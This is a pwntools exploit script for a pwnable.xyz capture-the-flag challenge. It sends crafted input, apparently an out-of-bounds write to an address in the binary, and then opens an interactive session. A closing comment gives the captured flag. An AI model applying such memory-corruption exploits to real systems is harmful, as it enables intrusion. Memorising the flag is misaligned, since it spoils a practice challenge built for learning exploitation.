from pwn import *

HOST, PORT = "svc.pwnable.xyz", 30002
EXE = "./challenge"
gs = """
break main
continue
"""

def start():
    if args.GDB:
        return gdb.debug(EXE, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE)

# ========== Exploit script here ==========
if __name__ == '__main__':
    elf = context.binary = ELF(EXE)
    io = start()

    io.sendlineafter(b': ', f'0 4196386 13'.encode())
    io.sendlineafter(b': ', b'a b c')
    
    io.interactive()

# Flag: FLAG{easy_00b_write}